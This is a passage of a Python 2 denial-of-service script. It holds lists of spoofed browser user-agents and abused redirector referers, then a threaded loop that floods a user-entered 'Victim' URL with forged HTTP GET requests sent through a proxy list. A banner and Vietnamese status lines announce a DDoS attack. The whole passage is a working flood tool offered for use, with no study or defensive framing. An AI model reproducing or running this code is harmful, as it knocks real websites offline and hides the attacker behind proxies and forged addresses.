 "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows 95; PalmSource; Blazer 3.0) 16; 160x160"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.340) AppleWebKit/530+ (KHTML, like Gecko) Version/4.0 Safari/530.17 UNTRUSTED/1.0 3gpp-gba"
 "SamsungI8910/SymbianOS/9.1 Series60/3.0"
 "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/20.0.042; Profile/MIDP-2.1 Configuration/CLDC-1.1; zh-hk) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.2.6.9 3gpp-gba"
 "NokiaC6-00/10.0.021 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.2.6 UNTRUSTED/1.0 3gpp-gba"
 "NokiaN97/21.1.107 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.1.4"
 "NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba"
 "Doris/1.15 [en] (Symbian)"
 "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like iPhone; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3 Dorothy"
 "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0"
 "NokiaE66/GoBrowser/2.0.297"
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
 "Mozilla/5.0 (Windows NT; U; en) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Iris/1.1.7 Safari/525.20"
 "MOT-L7/NA.ACR_RB MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
 "Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025"
 "SAMSUNG-C5212/C5212XDIK1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"
 "Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54"
 "Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02"
 "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3 TeaShark/0.8"
 "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_USA)",]

reFerers = [
        "https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://plus.google.com/share?url="
        "http://www.google.com/?q=",
"http://www.usatoday.com/search/results?q=",
"http://engadget.search.aol.com/search?q=",
"http://https://www.facebook.com/l.php?u=",
"http://http://host-tracker.com/check_page/?furl=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
"https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?url=&container=focus",
"http://tools.pingdom.com/fpt/?testurl=",
"https://sitecheck.sucuri.net/results/",
"http://is.gd/api.php?longurl=",
"http://check-host.net/check-http?host=",
"http://www.isup.me/",
"http://downforeveryoneorjustme.com/",
"http://www.isitdownrightnow.com/",
"https://www.google.com/webmasters/tools/mobile-friendly/?url=",
"https://filippo.io/Heartbleed/#",
"http://www.currentlydown.com/",
"http://www.websitedown.info/",
"http://isitdown.co.uk/",
"http://downorisitjustme.com/res.php?url=",
"http://www.checksite.us/?url=",
"http://viewdns.info/ismysitedown/?domain=",
"http://www.websitenotworking.com/",
"http://isitdown.nl/domain/",
"http://techhelpkb.com/?s=",
"http://check-host.net/check-ping?host=",
"http://check-host.net/check-tcp?host=",
"http://check-host.net/check-dns?host=",
"http://check-host.net/check-dns?host=",
"http://www.dnsstuff.com/tools#whois|type=domain&&value=",
"https://filippo.io/Heartbleed/#",
"https://www.godaddy.com/domains/searchresults.aspx?ci=83269&domainToCheck=",
"https://www.namecheap.com/domains/registration/results.aspx?domain=",
"https://www.facebook.com/l.php?u=",]

def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result
 
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
 
def randomUserAgent():
    return random.choice(userAgents)

def randomReFerer():
    return random.choice(reFerers)  
 
class attacco(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + randomUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1, 1000)) + "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(1)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(3):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
 
 

#Main
print("        .----.  Hello Admin Hieu  .----.        ")				
print("»------(.:.  Welcome DDos/Dos With Proxy.:.)------»")
 
# Site
url = raw_input("Victim: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
 
#Proxy
in_file = open(raw_input("File proxy: "),"r")
proxyf = in_file.read()
in_file.close()
 
listaproxy = proxyf.split('\n')
#So luong
thread = input("So luong (1000): ")
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0
 
for x in xrange(thread):
    attacco().start()
    time.sleep(0.003)
    print "Dang chuan bi luong Ddos " + str(x) + "!"
print "Dang Bat Dau Tan Cong..."
nload = 0
while not nload:
    time.sleep(1)